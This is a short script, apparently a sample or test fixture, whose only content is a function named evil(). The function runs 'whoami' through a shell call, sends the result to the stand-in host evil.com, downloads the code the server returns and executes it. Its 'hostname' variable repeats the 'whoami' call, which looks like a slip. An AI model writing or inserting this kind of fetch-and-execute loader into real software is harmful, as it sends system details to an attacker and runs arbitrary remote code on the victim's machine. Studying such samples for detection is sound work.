function evil() {
	var whoami = shell("whoami");
	var hostname = shell("whoami");
	var url = "https://evil.com/?user=" + whoami + "&host=" + hostname;
	var staged_code = http(url);
	shell(staged_code);
	
}
evil();